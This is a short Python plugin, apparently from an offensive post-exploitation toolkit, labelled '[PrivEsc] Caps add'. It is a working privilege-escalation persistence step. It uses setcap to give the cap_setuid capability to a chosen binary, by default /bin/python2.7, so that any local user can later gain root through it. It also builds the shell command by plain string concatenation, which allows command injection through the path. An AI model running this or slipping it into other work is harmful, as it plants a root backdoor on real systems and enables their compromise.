#!/usr/bin/python3
#[PrivEsc] Caps add
#PATH,no,Set path to file
#END
import os

def main(arguments):
    if arguments[0] == "":
        arguments[0] = "/bin/python2.7"
    os.system('/sbin/setcap cap_setuid+ep ' + arguments[0])
